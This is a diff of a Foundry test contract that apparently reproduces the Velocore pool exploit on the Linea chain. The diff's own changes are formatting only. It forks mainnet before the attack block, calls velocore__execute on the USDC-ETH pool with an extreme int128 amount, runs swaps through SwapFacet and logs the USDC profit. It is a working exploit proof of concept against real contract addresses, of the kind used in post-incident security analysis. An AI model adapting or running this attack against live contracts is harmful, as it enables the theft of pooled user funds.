@@ -11,8 +11,7 @@ import "./../interface.sol";
 
 // @Analysis: https://x.com/BeosinAlert/status/1797247874528645333
 
-interface ConstantProductPool{
-
+interface ConstantProductPool {
     type Token is bytes32;
 
     function velocore__execute(
@@ -25,7 +24,6 @@ interface ConstantProductPool{
     function totalSupply() external view returns (uint256);
 
     function poolBalances() external view returns (uint256[] memory);
-
 }
 
 struct VelocoreOperation {
@@ -34,8 +32,7 @@ struct VelocoreOperation {
     bytes data;
 }
 
-interface SwapFacet{
-
+interface SwapFacet {
     type Token is bytes32;
 
     function execute(
@@ -43,12 +40,9 @@ interface SwapFacet{
         int128[] memory deposit,
         VelocoreOperation[] memory ops
     ) external payable;
-
 }
 
-
 contract ContractTest is Test {
-
     type Token is bytes32;
 
     address USDC_ETH_VLP = 0xe2c67A9B15e9E7FF8A9Cb0dFb8feE5609923E5DB;
@@ -63,18 +57,13 @@ contract ContractTest is Test {
 
     bytes32 USDC_ETH_VLP_bytes32 = 0x000000000000000000000000e2c67a9b15e9e7ff8a9cb0dfb8fee5609923e5db;
 
-
-
-
-
     function setUp() public {
-        vm.createSelectFork("https://linea.drpc.org", 5079177 - 1);
+        vm.createSelectFork("https://linea.drpc.org", 5_079_177 - 1);
     }
 
     function testExploit() public {
-
-        // 1. Check the total Supply Before Attack of VLP 
-        uint256  totalSupplyBeforeAttack = ConstantProductPool(USDC_ETH_VLP).totalSupply();
+        // 1. Check the total Supply Before Attack of VLP
+        uint256 totalSupplyBeforeAttack = ConstantProductPool(USDC_ETH_VLP).totalSupply();
 
         // console.log("total Supply Before Attack:", totalSupplyBeforeAttack);
 
@@ -87,8 +76,8 @@ contract ContractTest is Test {
 
         int128[] memory amounts = new int128[](2);
 
-        amounts[0] = 170141183460469231731687303715884105727;
-        amounts[1] = 8616292632827688;
+        amounts[0] = 170_141_183_460_469_231_731_687_303_715_884_105_727;
+        amounts[1] = 8_616_292_632_827_688;
 
         ConstantProductPool(USDC_ETH_VLP).velocore__execute(address(this), tokens, amounts, hex"");
 
@@ -156,16 +145,14 @@ contract ContractTest is Test {
 
         SwapFacet(swapfacet).execute(tokenRef, deposit, ops);
 
-        // 5. Check the profit after attack 
+        // 5. Check the profit after attack
 
         uint256 usdc_e_balance = IERC20(USDC_e).balanceOf(address(this));
 
         console.log("---------------------------------------------------");
-        console.log("USDC_e profit after attack: $", usdc_e_balance / 10**6);
+        console.log("USDC_e profit after attack: $", usdc_e_balance / 10 ** 6);
         console.log("---------------------------------------------------");
     }
 
-
     receive() external payable {}
-
 }
